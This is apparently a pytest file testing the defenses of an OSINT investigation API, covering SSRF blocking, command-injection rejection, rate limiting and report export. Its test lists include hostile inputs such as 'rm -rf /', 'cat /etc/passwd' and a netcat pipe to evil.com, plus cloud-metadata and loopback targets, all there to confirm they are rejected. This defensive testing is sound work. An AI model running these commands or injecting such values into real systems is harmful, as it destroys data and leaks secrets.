import pytest
from httpx import ASGITransport, AsyncClient

from src.app.api.main import app
from src.app.api.routes.investigations import create_rate_limiter, export_rate_limiter
from src.app.application.investigation_service import InvestigationService
from src.app.domain.enums import (
    ConfidenceLevel,
    EntityKind,
    InfoClassification,
    InvestigationType,
    TargetKind,
)
from src.app.domain.ports.adapter import EntityDraft, EvidenceDraft
from src.app.infrastructure.database import Base, SessionLocal, engine


@pytest.fixture(autouse=True)
def setup_test_db(monkeypatch):
    from src.app.infrastructure.config import get_settings

    monkeypatch.setattr(get_settings(), "ENV", "test")
    monkeypatch.setattr(get_settings(), "RATE_LIMIT_ENABLED", False)
    create_rate_limiter.reset()
    export_rate_limiter.reset()
    Base.metadata.create_all(bind=engine)
    yield
    Base.metadata.drop_all(bind=engine)
    create_rate_limiter.reset()
    export_rate_limiter.reset()


@pytest.mark.asyncio
async def test_ssrf_protection_matrix():
    """Verify that private IP ranges, loopback, cloud metadata, and internal domains are blocked."""
    dangerous_targets = [
        # Cloud metadata
        ("ip", "169.254.169.254"),
        ("url", "http://169.254.169.254/latest/meta-data"),
        ("domain", "metadata.google.internal"),
        # Localhost & Loopbacks
        ("ip", "127.0.0.1"),
        ("ip", "0.0.0.0"),
        ("ip", "::1"),
        ("url", "http://127.0.0.1:8000/admin"),
        ("url", "http://localhost:3000"),
        ("url", "http://[::1]:9000"),
        # Private RFC1918 networks
        ("ip", "192.168.1.1"),
        ("ip", "10.0.0.1"),
        ("ip", "172.16.5.20"),
        ("url", "http://192.168.0.100/router"),
        # IPv4-mapped IPv6
        ("ip", "::ffff:127.0.0.1"),
        ("url", "http://[::ffff:127.0.0.1]/status"),
        # Internal TLDs
        ("domain", "corp.local"),
        ("domain", "db.internal"),
        ("domain", "router.lan"),
        ("url", "http://service.internal:5000"),
        # Carrier-grade NAT
        ("ip", "100.64.0.1"),
    ]

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        for kind, val in dangerous_targets:
            payload = {
                "name": f"SSRF Attack Test: {val}",
                "target_kind": kind,
                "target_value": val,
                "investigation_type": "quick",
            }
            res = await client.post("/api/v1/investigations", json=payload)
            assert res.status_code == 422, f"Target {kind}:{val} was NOT blocked! Status: {res.status_code}"
            assert "SSRF Protection" in res.json()["detail"]


@pytest.mark.asyncio
async def test_allow_private_targets_override():
    """Verify that private targets are permitted when explicitly allowed in investigation settings."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        payload = {
            "name": "Permitted Internal Investigation",
            "target_kind": "ip",
            "target_value": "192.168.1.50",
            "investigation_type": "quick",
            "settings": {"allow_private_targets": True},
        }
        res = await client.post("/api/v1/investigations", json=payload)
        assert res.status_code == 201
        assert res.json()["target_value"] == "192.168.1.50"


@pytest.mark.asyncio
async def test_command_injection_defense():
    """Verify that shell metacharacters and control characters are rejected across all target types."""
    injection_payloads = [
        ("username", "admin; rm -rf /"),
        ("username", "test && whoami"),
        ("username", "user|cat /etc/passwd"),
        ("person_name", "John `id` Doe"),
        ("person_name", "Jane $(cat flag) Doe"),
        ("organization", "Acme; drop database"),
        ("repository", "torvalds/linux; rm -rf /"),
        ("phone", "+12025550143\nrm -rf /"),
        ("national_id", "12345678;ls"),
        ("location", "New York | nc evil.com 4444"),
    ]

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        for kind, val in injection_payloads:
            payload = {
                "name": f"Command Injection Test: {val}",
                "target_kind": kind,
                "target_value": val,
                "investigation_type": "quick",
            }
            res = await client.post("/api/v1/investigations", json=payload)
            assert res.status_code == 422, f"Injection payload {kind}:{val} was not rejected!"
            detail = res.json()["detail"]
            assert "illegal control or shell metacharacters" in detail or "contains invalid characters" in detail or "Invalid" in detail


@pytest.mark.asyncio
async def test_sliding_window_rate_limiting(monkeypatch):
    """Verify that rate limiter returns 429 and Retry-After header on exceeding threshold."""
    from src.app.infrastructure.config import get_settings

    monkeypatch.setattr(get_settings(), "RATE_LIMIT_ENABLED", True)
    create_rate_limiter.reset()

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # Create rate limiter allows 10 requests / 60 seconds
        for i in range(10):
            payload = {
                "name": f"Rate Test {i}",
                "target_kind": "username",
                "target_value": f"target_user_{i}",
                "investigation_type": "quick",
            }
            res = await client.post("/api/v1/investigations", json=payload)
            assert res.status_code == 201, f"Request {i} failed prematurely"

        # 11th request must be rejected with 429 Too Many Requests
        payload = {
            "name": "Rate Test Exceeded",
            "target_kind": "username",
            "target_value": "target_user_exceeded",
            "investigation_type": "quick",
        }
        res_exceeded = await client.post("/api/v1/investigations", json=payload)
        assert res_exceeded.status_code == 429
        assert "Retry-After" in res_exceeded.headers
        assert int(res_exceeded.headers["Retry-After"]) >= 1
        assert res_exceeded.headers["X-RateLimit-Limit"] == "10"
        assert res_exceeded.headers["X-RateLimit-Remaining"] == "0"
        assert "Rate limit exceeded" in res_exceeded.json()["detail"]


@pytest.mark.asyncio
async def test_export_report_markdown_and_security_headers():
    """Verify that markdown export contains provenance, Bayesian confidence scores, and safe headers."""
    db = SessionLocal()
    try:
        inv = InvestigationService.create_investigation(
            db=db,
            name="Report Export Test",
            target_kind=TargetKind.DOMAIN,
            target_value="sec-target.org",
            investigation_type=InvestigationType.FULL,
        )


        from src.app.application.normalizer import EntityNormalizer

        normalizer = EntityNormalizer(inv.id)

        # Add entity with evidence
        ent, _ = normalizer.normalize_entity(
            EntityDraft(
                kind=EntityKind.DOMAIN,
                value="sub.sec-target.org",
                confidence=ConfidenceLevel.STRONG,
                attributes={"ip": "1.2.3.4"},
            )
        )
        db.add(ent)
        db.flush()

        ev = normalizer.create_evidence(
            EvidenceDraft(
                source="Security Audit",
                tool="amass",
                raw_observation="subdomain discovered: sub.sec-target.org",
                confidence=ConfidenceLevel.STRONG,
                info_classification=InfoClassification.PUBLIC_REGISTRY,
            ),
            entity_id=ent.id,
        )
        db.add(ev)
        db.commit()

        inv_id_str = str(inv.id)
    finally:
        db.close()

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # Markdown export
        res_md = await client.get(f"/api/v1/investigations/{inv_id_str}/export?format=markdown")
        assert res_md.status_code == 200
        assert res_md.headers["content-type"].startswith("text/markdown")
        assert res_md.headers["content-disposition"] == f'attachment; filename="investigation_{inv_id_str}.md"'

        body = res_md.text
        assert "OpenIntel Intelligence Report" in body
        assert "## 1. Executive Summary" in body
        assert "## 2. Intelligence & Bayesian Confidence Metrics" in body
        assert "## 3. Legal & Regulatory Classifications" in body
        assert "## 4. Entity Discovered Catalog" in body
        assert "## 6. Full Evidence Provenance Audit Log" in body
        assert "PUBLIC_REGISTRY" in body
        assert "amass" in body
        assert "sub.sec-target.org" in body

        # JSON export
        res_json = await client.get(f"/api/v1/investigations/{inv_id_str}/export?format=json")
        assert res_json.status_code == 200
        json_data = res_json.json()
        assert json_data["id"] == inv_id_str
        assert len(json_data["entities"]) >= 1

        # Invalid format rejection
        res_bad = await client.get(f"/api/v1/investigations/{inv_id_str}/export?format=pdf_traversal")
        assert res_bad.status_code == 422
